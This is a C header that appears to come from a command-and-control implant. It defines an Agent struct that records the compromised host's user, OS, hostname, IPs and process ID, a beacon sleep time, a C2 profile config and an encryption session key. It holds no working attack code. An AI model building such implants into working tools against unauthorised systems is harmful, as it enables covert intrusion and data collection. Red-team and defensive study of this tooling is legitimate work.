#ifndef AGENT_H
#define AGENT_H
#include "config.h"
#include "utils.h"
#include <stdbool.h>
#define UUIDSIZE 36

// C2Config holds all configuration specific to the active C2 profile (e.g.
// HTTP host/endpoint/proxy/useragent). It's defined by the corresponding
// src/c2/*.c implementation and only ever accessed through that
// implementation's functions.
typedef struct C2Config C2Config;

typedef struct Agent {
    char uuid[256];
    char payload_uuid[UUIDSIZE + 1]; // original build-time UUID; never overwritten by EKE
    char procname[256];
    char user[256];
    char os[256];
    char host[256];
    char *ips[256];
    int ipcount;
    int sleeptime;
    int pid;
    C2Config *c2config;
#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)
    unsigned char session_key[32]; // AES-256 / HMAC-SHA256 key
#endif
} Agent;

Agent *createAgent(char *name);
void destroyAgent(Agent *agent);

#ifdef DEBUG
void printAgent(Agent *agent);
#else
#define printAgent(agent) ((void)0)
#endif

#endif // !AGENT_H
